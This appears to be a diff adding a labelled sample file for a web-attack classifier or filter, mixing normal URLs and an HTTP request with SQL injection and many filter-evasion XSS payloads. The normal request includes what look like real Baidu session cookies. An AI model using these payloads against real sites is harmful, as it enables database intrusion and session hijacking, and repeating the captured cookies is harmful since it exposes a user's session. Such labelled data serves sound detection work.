@@ -1,0 +1,61 @@
+normal url
+https://www.bilibili.com/read/cv2415756？spm_id_from=333.334.b_63686965665f7265636f6d6d656e64.1
+https://blog.csdn.net/m0_37947204/article/details/80489431
+https://item.taobao.com/item.htm?spm=a217h.9580640.831217.1.617b25aaomZK7y&id=563338707008&scm=1007.12144.81309.70043_0_0&pvid=5498f879-e4c3-4bdb-92c5-05a63882c671&utparam=%7B%22x_hestia_source%22%3A%2270043%22%2C%22x_object_type%22%3A%22item%22%2C%22x_mt%22%3A9%2C%22x_src%22%3A%2270043%22%2C%22x_pos%22%3A1%2C%22x_pvid%22%3A%225498f879-e4c3-4bdb-92c5-05a63882c671%22%2C%22x_object_id%22%3A563338707008%7D
+https://item.taobao.com/item.htm?spm=a217h.9580640.831236.7.617b25aaomZK7y&id=526565541188&scm=1007.12144.81309.69881_0_0&pvid=0611e3ab-0bb9-414e-b2fe-47bbf3d1e2bb&utparam=%7B%22x_hestia_source%22%3A%2269881%22%2C%22x_object_type%22%3A%22item%22%2C%22x_mt%22%3A8%2C%22x_src%22%3A%2269881%22%2C%22x_pos%22%3A1%2C%22x_pvid%22%3A%220611e3ab-0bb9-414e-b2fe-47bbf3d1e2bb%22%2C%22x_object_id%22%3A526565541188%7D
+
+
+sql inject
+/*!UnIon/*/*%0s%0y*/seLeCT*/ 1,'test',3/piw/Question/module/code.jsp?value=1' AND (SELECT 2554 FROM(SELECT COUNT(*),CONCAT(0x7c,(MID((IFNULL(CAST(md5(0x234445) AS CHAR),0x20)),1,50)),0x7c,FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'HgST'='HgST
+/*!UnIon/*/*%0s%0z*/seLeCT*/ 1,'test',3/zcb/?page=2') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+/*!UnIon/*/*%0t/**/seLeCT*/ 1,'test',3/zcb/?page=2" UNION ALL SELECT NULL-- 
+/*!UnIon/*/*%0t*//*!seLeCT*/ 1,'test',3/yk10/?page=-2359%') UNION ALL SELECT 1075, 1075, 1075, 1075, 1075, 1075, 1075, 1075, 1075, 1075, 1075, 1075, 1075, 1075, 1075-- 
+/*!UnIon/*/*%0t*/ seLeCT*/ 1,'test',3/
+
+
+Xss attack
+<script>alert('foolish!')</script>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<IMG SRC="javascript:alert('XSS');">
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+
+
+xss attack http
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<Video> <source onerror = "javascript: alert (XSS)">
+<Input value = "XSS" type = text>
+<applet code="javascript:confirm(document.cookie);">
+<isindex x="javascript:" onmouseover="alert(XSS)">
+"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+"><img src="x:x" onerror="alert(XSS)">
+"><iframe src="javascript:alert(XSS)">
+<object data="javascript:alert(XSS)">
+<isindex type=image src=1 onerror=alert(XSS)>
+<img src=x:alert(alt) onerror=eval(src) alt=0>
+<img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>
+<iframe/src="data:text/html,<svg onload=alert(1)>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<form><a href="javascript:\u0061lert(1)">X
+</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
+<style>//*{x:expression(alert(/xss/))}//<style></style> 
+On Mouse Over​
+<img src="/" =_=" title="onerror='prompt(1)'">
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
+<script x> alert(1) </script 1=2
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> 
+
+
+normal http
+GET /su?wd=w+w&action=opensearch&ie=UTF-8 HTTP/1.1
+Host: suggestion.baidu.com
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: BAIDUID=ADAA8B98480910D89645E08D8DE25ABC:FG=1; PSTM=1553343129; BIDUPSID=FB1BBB99FF6528F32BE1CDDE851469CE; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; MCITY=-%3A; delPer=0; ZD_ENTRY=baidu; pgv_pvi=4732770304; pgv_si=s1269809152; PSINO=2; H_PS_PSSID=1456_21127_28720_28558_28830_28585_28641_26350_28519_28605; BDUSS=FqWm1UV05FcUZEdTlaRGFEYVdHcnBKaGgxYkhCc2M0c3VDbUszbEV6aHNIOU5jSVFBQUFBJCQAAAAAAAAAAAEAAADnWxQheWFucWlzZW4xOTk2MTIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGySq1xskqtcaT; BDSFRCVID=vu-sJeCCxG3J7Dn9G2KKbVszfan2Bet3ub7e3J; H_BDCLCKID_SF=tJIJ_CK-tDD3fP36q4coK4L3MfbWKR3eHD7yWCvl-DbcOR5Jj65CQ-0U2JK8tqQBbbrv_h6DXbOhsnRC3MA--t4rBpQjhlJuBHTzQROO5noJsq0x0-ole-bQyPQaJxT2QKOMahv95h7xO-0xQlPK5JkgMx6MqpQJQeQ-5KQN3KJmhpFue5_ajT3BepJf-K6bKCjKB6rJaDvKHlTOy4oTj6Djy-OQa6K8JjRb-Co9Jh6tOMn8Qjjx3MvB-trh-xRi2DJlo4jq0b7dsbjGQft20b0EeMtjBbLLfNOCWb7jWhviep72ybt2QlRX5q79atTMfNTJ-qcH0KQpsIJMDUC0jjcLjHtJtTn2aI52Bb88KRbVHtOmbJK_-P4DqxbXqb5tH67Z0lOnMp05OC3eh6rnDxPU-Rjeht5KaJrG04-bbR_beDO_e4bK-TrBDGDOtx5
